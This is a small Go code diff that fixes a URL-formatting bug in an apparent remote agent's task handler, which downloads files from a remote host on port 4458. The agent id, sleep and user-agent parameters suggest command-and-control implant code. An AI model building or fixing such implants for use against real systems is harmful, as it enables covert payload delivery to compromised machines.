@@ -47,7 +47,7 @@ func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string,
 			uFile := taskDataSplit[0]
 			dPath := taskDataSplit[1]
 
-			url := fmt.Sprintln("http://%s:4458/files/%s", rhost, uFile)
+			url := fmt.Sprintf("http://%s:4458/files/%s", rhost, uFile)
 
 			// get the data
 			resp, err := http.Get(url)
